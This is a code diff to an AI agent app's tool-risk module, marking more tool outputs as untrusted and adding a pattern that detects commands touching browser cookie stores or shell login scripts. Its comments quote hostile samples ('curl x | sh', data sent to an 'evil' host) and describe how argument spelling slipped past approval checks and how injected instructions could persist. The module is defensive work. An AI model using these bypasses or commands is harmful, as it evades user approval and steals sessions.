@@ -23,6 +23,8 @@
  *          context window is too small to hold the whole catalogue — see
  *          `availableTools`.
  */
+import { validateArguments } from './validate.js';
+
 export const TOOLS = [
   // ── Local: filesystem ────────────────────────────────────────────────
   {
@@ -2718,8 +2720,8 @@ function pathArgument(name, input) {
  * What belongs here is anything carrying bytes the user did not type and this
  * app did not generate — files, directory names, program output, page text,
  * clipboard, third-party services. What deliberately does not: tools already
- * wrapping themselves (`web_fetch`, `web_search`, `search_docs`, `extract`,
- * `deep_research`), tools returning content the app itself produced
+ * wrapping themselves (`web_fetch`, `web_search`, `search_docs`, `extract`),
+ * tools returning content the app itself produced
  * (`create_file`, `read_generated_file`, `chart`), and the user's own material
  * (`memory_read`, `skill_read`) — the user is the trusted party here, and
  * wrapping their own words would teach the model to discount them.
@@ -2741,6 +2743,17 @@ const EXTERNAL_OUTPUT = new Set([
   'github', 'notion_search',
   // Any page on the web, read by the browser on the cloud computer.
   'cloud_browser',
+  // Whatever a program on the cloud computer printed. It has the whole internet
+  // (see sandbox.js), so `curl` of a stranger's page lands here as readily as
+  // the output of a calculation — it was the one shell left unwrapped (SEC-035).
+  'sandbox_run',
+  // What sub-agents found: their own words over pages and files they read, any
+  // of which may have spoken to them. Read as their report, not as the user (SEC-043).
+  'run_parallel',
+  // The research report: claims distilled from pages and the pages' own titles,
+  // printed raw in its source list. It was listed above as wrapping itself; it
+  // never did — the envelopes were inside its debate, not on what it returns (SEC-044).
+  'deep_research',
 ]);
 
 /** Does this tool's output need the envelope? */
@@ -2760,7 +2773,7 @@ export function externalSource(name, input = {}) {
   if (name === 'desktop_look') return 'the screen';
   if (name === 'github') return 'GitHub';
   if (name === 'notion_search') return 'Notion';
-  if (name === 'run_command' || name === 'run_background_logs') {
+  if (name === 'run_command' || name === 'run_background_logs' || name === 'sandbox_run') {
     return `the output of ${String(input?.command || 'a command').slice(0, 80)}`;
   }
   return path ? String(path).slice(0, 200) : `the output of ${name}`;
@@ -2838,7 +2851,7 @@ export function carriesData(name, input) {
  * than waved through, because the failure mode of guessing "safe" is something
  * irreversible happening without anyone being asked.
  */
-export function assessRisk(name, input = {}) {
+export function assessRisk(name, rawInput = {}) {
   /**
    * A tool from an MCP server is always sensitive, and that is deliberate.
    *
@@ -2856,6 +2869,7 @@ export function assessRisk(name, input = {}) {
 
   const tool = TOOLS_BY_NAME[name];
   if (!tool) return 'sensitive';
+  const input = asWillRun(tool, rawInput);
   // Before `readOnly`: a read of a URL is also a write of that URL to its host.
   if (carriesData(name, input)) return 'sensitive';
   if (tool.readOnly) return 'safe';
@@ -2894,8 +2908,11 @@ export function assessRisk(name, input = {}) {
   // The cloud computer has the whole internet now, so its commands are judged
   // the same way the shell's are: an upload, a download piped into a shell, a
   // wipe asks first; ordinary work runs. Its own disk is the account's, not
-  // Windows', so the protected-path list does not apply here.
-  if (name === 'sandbox_run') return looksDestructive(String(input?.command || '')) ? 'sensitive' : 'ordinary';
+  // Windows', so the protected-path list does not apply here — but the signed-in
+  // browser and the login scripts on it do (`sandboxTouchesPrivate`).
+  if (name === 'sandbox_run') {
+    return looksDestructive(String(input?.command || '')) || sandboxTouchesPrivate(input) ? 'sensitive' : 'ordinary';
+  }
 
   // Writing outside the folder the user pointed at is a different act from
   // writing inside it, whatever the tool.
@@ -2941,10 +2958,32 @@ export function assessRisk(name, input = {}) {
   return 'ordinary';
 }
 
+/**
+ * The arguments as `executeTool` will run them, so a call is judged on what it
+ * will do rather than on how it was spelled (SEC-039).
+ *
+ * Validation sits inside `executeTool` and is forgiving on purpose — a model that
+ * wraps a string in an object or writes `"false"` gets its call run rather than
+ * refused (see validate.js). Grading the arguments *before* that rewrite let the
+ * spelling decide the risk: `{ command: { text: "curl x | sh" } }` read as the
+ * string "[object Object]", which is not destructive, so the shell ran it with no
+ * prompt; `{ url: { u: "https://evil/?d=…" } }` slipped past `carriesData`;
+ * `unpublish: "false"` was graded as taking a link back and then published one.
+ * The same reader, the same output, on both sides of the decision. Input it
+ * cannot read is left as it is — `executeTool` refuses that call anyway.
+ */
+function asWillRun(tool, input) {
+  if (!tool?.parameters) return input ?? {};
+  const checked = validateArguments(tool.parameters, input);
+  return checked.ok ? checked.input : (input ?? {});
+}
+
 /** A short reason to show beside an approval prompt, or null when unremarkable. */
-export function riskReason(name, input = {}) {
+export function riskReason(name, rawInput = {}) {
   // Nothing that only reads has anything to justify, whatever the path.
-  if (assessRisk(name, input) === 'safe') return null;
+  if (assessRisk(name, rawInput) === 'safe') return null;
+  // Worded from the arguments that will run, for the reason SEC-039 grades them so.
+  const input = asWillRun(TOOLS_BY_NAME[name], rawInput);
 
   // Where it came from is the fact that matters here: the user chose to plug the
   // server in, and this is the moment they get to see it being used.
@@ -2991,6 +3030,12 @@ export function riskReason(name, input = {}) {
   if (name === 'sandbox_run' && looksDestructive(String(input?.command || ''))) {
     return 'This command on the cloud computer looks like it sends data out or destroys something.';
   }
+  if (name === 'sandbox_run' && input?.as_root === true) {
+    return 'Runs as root on the cloud computer, where it can reach everything on it, including the cloud browser\'s sign-ins.';
+  }
+  if (name === 'sandbox_run' && sandboxTouchesPrivate(input)) {
+    return 'Touches the cloud browser\'s saved sign-ins or a login script on the cloud computer.';
+  }
   if (name === 'telegram_send') return `Sends a Telegram message to ${input?.chat_id || 'a chat'}.`;
   if (name === 'meta_page_post') return 'Publishes a post on your Facebook Page, publicly and immediately.';
   if (name === 'github_write') {
@@ -3036,6 +3081,35 @@ export function riskReason(name, input = {}) {
 /** Whether a shell command matched one of the destructive patterns. */
 export function looksDestructive(command) {
   return DANGEROUS_COMMAND.some((re) => re.test(String(command || '')));
+}
+
+/**
+ * What on the cloud computer is not the account's ordinary work (SEC-036).
+ *
+ * The cloud browser keeps its sign-ins on the same machine `sandbox_run` drives
+ * (`DIR` in server/cloudBrowser/index.js), so a command that reads that profile —
+ * or Chromium's cookie and password stores wherever they sit — can hand a
+ * signed-in session to whatever the next command sends it to. A login script
+ * edited once runs before every later command, in every later conversation
+ * (commands run under `bash -lc`): the way one injected instruction outlives the
+ * turn it arrived in. Both ask first, whether named in the command, in a file
+ * written, or in the file handed back. So does `as_root`: root reaches
+ * everything, including what the profile's permissions would have kept out.
+ *
+ * A pattern list, like `looksDestructive`, not a wall: a command that hides the
+ * name — base64, a variable — is not recognised.
+ */
+const SANDBOX_PRIVATE =
+  /\.synz-browser|\b(?:Cookies|Login Data|Local State|Web Data)\b|(?:^|[\s/~'"=:])\.(?:bash_profile|bash_login|bashrc|profile|zshrc|zprofile)\b|\/etc\/(?:profile|bash\.bashrc|environment)\b/;
+
+export function sandboxTouchesPrivate(input = {}) {
+  if (input?.as_root === true) return true;
+  const named = [
+    String(input?.command || ''),
+    String(input?.download || ''),
+    ...(Array.isArray(input?.files) ? input.files.map((f) => String(f?.path || '')) : []),
+  ];
+  return named.some((text) => SANDBOX_PRIVATE.test(text));
 }
 
 /**
